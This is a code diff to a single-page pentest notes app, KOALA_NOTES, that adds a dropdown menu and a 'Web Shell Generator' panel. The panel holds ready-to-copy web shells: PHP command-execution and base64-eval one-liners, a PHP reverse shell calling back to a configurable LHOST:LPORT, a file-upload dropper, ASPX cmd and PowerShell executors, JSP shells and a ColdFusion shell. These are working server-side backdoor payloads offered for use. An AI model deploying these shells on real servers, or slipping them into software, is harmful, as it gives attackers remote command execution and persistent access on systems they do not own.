@@ -248,15 +248,23 @@ body {
 <div id="topbar">
   <div style="font-weight:bold; color:var(--accent); margin-right:8px;">KOALA_NOTES</div>
   
-  <button id="tab-notes" class="tb-btn btn-purple" onclick="switchTab('notes')">notes</button>
-  <button id="tab-url" class="tb-btn" onclick="switchTab('url')">encoder</button>
-  <button id="tab-ip" class="tb-btn" onclick="switchTab('ip')">ip lookup</button>
-  <button id="tab-osint" class="tb-btn" onclick="switchTab('osint')">osint hub</button>
-  <button id="tab-rshells" class="tb-btn" onclick="switchTab('rshells')">reverse shells</button>
-  <button id="tab-exploit" class="tb-btn" onclick="switchTab('exploit')">exploit search</button>
-  <button id="tab-obfuscate" class="tb-btn" onclick="switchTab('obfuscate')">obfuscate</button>
-  <div class="tb-sep"></div>
+  <select id="page-nav" onchange="switchTab(this.value)"
+    style="background:var(--bg2); color:var(--text0); border:1px solid var(--border);
+           padding:5px 32px 5px 10px; border-radius:5px; outline:none; cursor:pointer;
+           font-family:inherit; font-size:12px; appearance:none; width:200px;
+           background-image:url('data:image/svg+xml;charset=UTF-8,%3csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 24 24%27 fill=%27none%27 stroke=%27%238b949e%27 stroke-width=%272%27 stroke-linecap=%27round%27 stroke-linejoin=%27round%27%3e%3cpolyline points=%276 9 12 15 18 9%27%3e%3c/polyline%3e%3c/svg%3e');
+           background-repeat:no-repeat; background-position:right 8px center; background-size:1em;">
+    <option value="notes">Notes Workspace</option>
+    <option value="url">Encoder Module</option>
+    <option value="ip">IP Geolocation</option>
+    <option value="osint">OSINT Master Hub</option>
+    <option value="rshells">Reverse Shells</option>
+    <option value="webshells">Web Shells</option>
+    <option value="exploit">Exploit Database</option>
+    <option value="obfuscate">Obfuscation Pipe</option>
+  </select>
   <button id="new-note-btn" class="tb-btn" onclick="newNote()">+ note</button>
+  <div class="tb-sep"></div>
   
   <div style="flex:1"></div> 
   
@@ -442,6 +450,43 @@ body {
     </div>
     </div><!-- end rshells-panel -->
 
+      <!-- Web Shells Panel -->
+      <div id="webshells-panel" style="flex: 1; display: none; flex-direction: column; gap: 20px; padding: 20px 24px; overflow-y: auto; background: var(--bg0);">
+
+        <div style="border-bottom: 1px solid var(--border); padding-bottom: 15px;">
+          <h2 style="color: var(--accent); font-size: 18px;">Web Shell Generator</h2>
+          <p style="font-size: 12px; color: var(--text2);">Pre-built server-side web shells. Set LHOST/LPORT for shells that require a callback.</p>
+        </div>
+
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; background: var(--bg1); padding: 18px; border-radius: 8px; border: 1px solid var(--border);">
+          <div style="display: flex; flex-direction: column; gap: 4px;">
+            <label style="font-size: 11px; color: var(--text1); font-weight: bold;">LHOST (Callback IP)</label>
+            <input type="text" id="ws-lhost" value="10.10.10.10" oninput="updateWebShells()" style="background: var(--bg2); border: 1px solid var(--border); color: var(--text0); padding: 8px 12px; border-radius: 4px; outline: none; font-family: monospace;">
+          </div>
+          <div style="display: flex; flex-direction: column; gap: 4px;">
+            <label style="font-size: 11px; color: var(--text1); font-weight: bold;">LPORT (Callback Port)</label>
+            <input type="text" id="ws-lport" value="4444" oninput="updateWebShells()" style="background: var(--bg2); border: 1px solid var(--border); color: var(--text0); padding: 8px 12px; border-radius: 4px; outline: none; font-family: monospace;">
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 20px; align-items: flex-start;">
+          <div style="width: 160px; display: flex; flex-direction: column; gap: 6px;">
+            <button class="tb-btn" id="ws-btn-all"   onclick="filterWebShells('all')"  style="width:100%; text-align:left;">All Shells</button>
+            <button class="tb-btn" id="ws-btn-php"   onclick="filterWebShells('php')"  style="width:100%; text-align:left;">PHP</button>
+            <button class="tb-btn" id="ws-btn-aspx"  onclick="filterWebShells('aspx')" style="width:100%; text-align:left;">ASPX</button>
+            <button class="tb-btn" id="ws-btn-jsp"   onclick="filterWebShells('jsp')"  style="width:100%; text-align:left;">JSP</button>
+            <button class="tb-btn" id="ws-btn-other" onclick="filterWebShells('other')" style="width:100%; text-align:left;">Other</button>
+            <input type="text" id="ws-search" placeholder="search web shells..."
+              style="margin-top: 4px; width: 100%; background: var(--bg2); border: 1px solid var(--border);
+                     color: var(--text0); font-size: 11px; padding: 6px 10px; border-radius: 4px;
+                     outline: none; font-family: inherit;"
+              oninput="updateWebShells()">
+          </div>
+          <div id="web-shells-container" style="flex: 1; display: flex; flex-direction: column; gap: 16px;"></div>
+        </div>
+
+      </div><!-- end webshells-panel -->
+
       <div id="exploit-panel" style="flex: 1; display: none; flex-direction: column; gap: 20px; padding: 20px 24px; overflow-y: auto; background: var(--bg0);">
         <div style="border-bottom: 1px solid var(--border); padding-bottom: 15px;">
           <h2 style="color: var(--accent); font-size: 18px;">Exploit Database Router</h2>
@@ -570,7 +615,7 @@ const osintSources = {
     phone: [
         { name: 'ThatsThem (Phone)', url: 'https://thatsthem.com/phone/' },
         { name: 'Google Reverse Lookup', url: 'https://www.google.com/search?q=', dork: '"', suffix: '"', isDork: true },
-        { name: 'USPhoneBook', url: 'https://www.usphonebook.com/' }
+        { name: 'USPhoneBook', url: 'https://www.usphonebook.com/phone-search/' }
     ],
     devices: [
         { name: 'Shodan (General)', url: 'https://www.shodan.io/search?query=' },
@@ -821,6 +866,9 @@ switchTab = function(targetTab) {
     originalTabSwitcher(targetTab);
     if (targetTab === 'rshells') {
         updateReverseShells();
+    }
+    if (targetTab === 'webshells') {
+        updateWebShells();
     }
     if (targetTab === 'obfuscate') {
         updateObfButtons();
@@ -1129,16 +1177,21 @@ function updateEditor() {
 function switchTab(tab) {
   currentTab = tab;
 
-  const tabs = ['notes', 'url', 'ip', 'osint', 'exploit', 'rshells', 'obfuscate'];
+  const tabs = ['notes', 'url', 'ip', 'osint', 'exploit', 'rshells', 'webshells', 'obfuscate'];
 
   tabs.forEach(t => {
-      const btn = document.getElementById(`tab-${t}`);
-      if (btn) btn.classList.toggle('btn-purple', tab === t);
-
       const panelId = (t === 'notes') ? 'note-editor' : `${t}-panel`;
       const panel = document.getElementById(panelId);
       if (panel) panel.style.display = (tab === t) ? 'flex' : 'none';
   });
+
+  // Sync dropdown
+  const nav = document.getElementById('page-nav');
+  if (nav) nav.value = tab;
+
+  // Show/hide new-note-btn
+  const nnb = document.getElementById('new-note-btn');
+  if (nnb) nnb.style.display = tab === 'notes' ? '' : 'none';
 
   // Hide the note title bar when not on the notes tab
   const ti = document.getElementById('note-title-input');
@@ -1909,6 +1962,83 @@ function copyObfOutput() {
     btn.textContent = 'copied!';
     setTimeout(() => btn.textContent = orig, 1200);
   });
+}
+
+// ── Web Shells ────────────────────────────────────────────────────────────
+const webShellBlueprints = [
+    // PHP
+    { name: "PHP Web Shell",            cat: "php",   desc: "Standard one-liner. Append ?cmd=whoami to execute.",       tmpl: "<?php system($_GET['cmd']); ?>" },
+    { name: "PHP Simple Exec",          cat: "php",   desc: "Basic cmd parameter shell via system().",                   tmpl: '<?php if(isset($_REQUEST[\'cmd\'])){ echo \'<pre>\'; system($_REQUEST[\'cmd\']); echo \'</pre>\'; die; } ?>' },
+    { name: "PHP Passthru One-liner",   cat: "php",   desc: "Minimal one-liner using passthru().",                      tmpl: "<?php passthru($_GET['cmd']); ?>" },
+    { name: "PHP Shell Exec",           cat: "php",   desc: "Returns full output buffer via shell_exec().",              tmpl: "<?php echo shell_exec($_GET['cmd']); ?>" },
+    { name: "PHP Reverse Shell",        cat: "php",   desc: "Opens TCP socket back to LHOST:LPORT.",                    tmpl: '<?php $sock=fsockopen("{LHOST}",{LPORT});$proc=proc_open(\'/bin/sh -i\',array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>' },
+    { name: "PHP Base64 Eval",          cat: "php",   desc: "Evals a base64-encoded payload from GET param.",           tmpl: "<?php eval(base64_decode($_GET['cmd'])); ?>" },
+    { name: "PHP File Upload Drop",     cat: "php",   desc: "Accepts a file upload and saves it to webroot.",           tmpl: "<?php move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']); ?>" },
+    // ASPX
+    { name: "ASPX Cmd Shell",           cat: "aspx",  desc: "Runs cmd.exe with supplied argument via C#.",              tmpl: '<%@ Page Language="C#" %><% System.Diagnostics.Process p=new System.Diagnostics.Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+Request["cmd"]; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>' },
+    { name: "ASPX PowerShell Drop",     cat: "aspx",  desc: "Spawns powershell.exe with -nop flag.",                   tmpl: '<%@ Page Language="C#" %><% var p=new System.Diagnostics.Process(); p.StartInfo.FileName="powershell"; p.StartInfo.Arguments="-nop -c "+Request["cmd"]; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>' },
+    { name: "ASPX Command Executor",    cat: "aspx",  desc: "Uses QueryString for input, full redirect.",              tmpl: '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process p = new Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>' },
+    // JSP
+    { name: "JSP Runtime Exec",         cat: "jsp",   desc: "Executes via Runtime.exec() with /bin/bash.",             tmpl: '<%Runtime rt=Runtime.getRuntime(); String[] commands={"/bin/bash","-c",request.getParameter("cmd")}; Process proc=rt.exec(commands); out.println(new java.util.Scanner(proc.getInputStream()).useDelimiter("\\\\A").next()); %>' },
+    { name: "JSP ProcessBuilder",       cat: "jsp",   desc: "Uses ProcessBuilder with error stream merge.",             tmpl: '<%@ page import="java.util.*,java.io.*"%><% String cmd=request.getParameter("cmd"); ProcessBuilder pb=new ProcessBuilder("/bin/bash","-c",cmd); pb.redirectErrorStream(true); Process p=pb.start(); out.println(new Scanner(p.getInputStream()).useDelimiter("\\\\A").next()); %>' },
+    { name: "JSP Webshell (Stream)",    cat: "jsp",   desc: "Byte-by-byte stream read, compatible with old Tomcat.",   tmpl: '<% String c = request.getParameter("cmd"); if(c!=null){ Process p = Runtime.getRuntime().exec(c); java.io.InputStream i = p.getInputStream(); int b; while((b=i.read())!=-1){ out.print((char)b); } } %>' },
+    // Other
+    { name: "ColdFusion Shell",         cat: "other", desc: "cfexecute tag — runs cmd.exe with url.cmd param.",        tmpl: '<cfexecute name="cmd.exe" arguments="/c #url.cmd#" timeout="10"></cfexecute>' },
+];
+
+let activeWebShellCat = 'all';
+
+function updateWebShells() {
+    const lhost = document.getElementById('ws-lhost')?.value.trim() || '10.10.10.10';
+    const lport = document.getElementById('ws-lport')?.value.trim() || '4444';
+    const search = (document.getElementById('ws-search')?.value || '').toLowerCase().trim();
+    const container = document.getElementById('web-shells-container');
+    if (!container) return;
+    container.innerHTML = '';
+
+    webShellBlueprints.forEach((bp, idx) => {
+        if (activeWebShellCat !== 'all' && bp.cat !== activeWebShellCat) return;
+        if (search && !bp.name.toLowerCase().includes(search) && !bp.tmpl.toLowerCase().includes(search)) return;
+
+        const raw = bp.tmpl.replace(/{LHOST}/g, lhost).replace(/{LPORT}/g, lport);
+        const id = `ws-str-${idx}`;
+
+        const card = document.createElement('div');
+        card.style.cssText = "background: var(--bg1); border: 1px solid var(--border); border-radius: 6px; padding: 14px; display: flex; flex-direction: column; gap: 8px;";
+        card.innerHTML = `
+            <div style="display:flex; justify-content:space-between; align-items:center; gap:8px;">
+                <span style="font-size:13px; font-weight:bold; color:var(--text0);">${bp.name}</span>
+                <span style="font-size:10px; background:var(--bg2); color:var(--text1); padding:2px 6px; border-radius:4px; text-transform:uppercase; font-family:monospace; flex-shrink:0;">${bp.cat}</span>
+            </div>
+            <div style="font-size:11px; color:var(--text2);">${bp.desc}</div>
+            <div style="border:1px solid var(--border); border-radius:4px; background:var(--bg0); overflow:hidden;">
+                <div style="display:flex; align-items:center; padding:10px; gap:10px;">
+                    <code id="${id}" style="flex:1; font-family:monospace; font-size:12px; color:var(--green); white-space:pre-wrap; word-break:break-all;">${escapeHtml(raw)}</code>
+                    <button class="tb-btn" style="font-size:11px; padding:4px 10px; flex-shrink:0;" onclick="copyWebShell('${id}', this)">Copy</button>
+                </div>
+            </div>
+        `;
+        container.appendChild(card);
+    });
+
+    if (!container.hasChildNodes()) {
+        container.innerHTML = '<div class="url-tip">No web shells match the current filter.</div>';
+    }
+}
+
+function filterWebShells(cat) {
+    activeWebShellCat = cat;
+    const s = document.getElementById('ws-search');
+    if (s) s.value = '';
+    updateWebShells();
+}
+
+function copyWebShell(id, btn) {
+    navigator.clipboard.writeText(document.getElementById(id).innerText).then(() => {
+        const txt = btn.innerText; btn.innerText = 'Copied!';
+        btn.style.borderColor = 'var(--green)';
+        setTimeout(() => { btn.innerText = txt; btn.style.borderColor = ''; }, 1000);
+    });
 }
 
 document.addEventListener('keydown', e => {
